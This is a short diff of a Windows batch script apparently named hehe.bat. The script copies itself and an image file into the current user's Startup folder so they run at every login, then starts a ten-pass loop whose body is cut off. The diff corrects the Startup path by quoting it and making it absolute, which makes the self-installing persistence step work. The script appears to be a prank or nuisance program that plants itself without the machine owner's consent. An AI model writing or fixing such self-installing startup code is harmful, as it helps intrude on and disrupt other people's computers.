@@ -1,6 +1,6 @@
 @echo off
-Xcopy /I /Y .\hehe.bat %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
-Xcopy /I /Y .\hehe.jpg %AppData%\Microsoft\Windows\Start Menu\Programs\Startup\
+Xcopy /I /Y .\hehe.bat "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+Xcopy /I /Y .\hehe.jpg "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 set rmcolon=%time::=%
 set rmcomma=%rmcolon:,=%
 FOR /L %%A IN (1,1,10) DO (
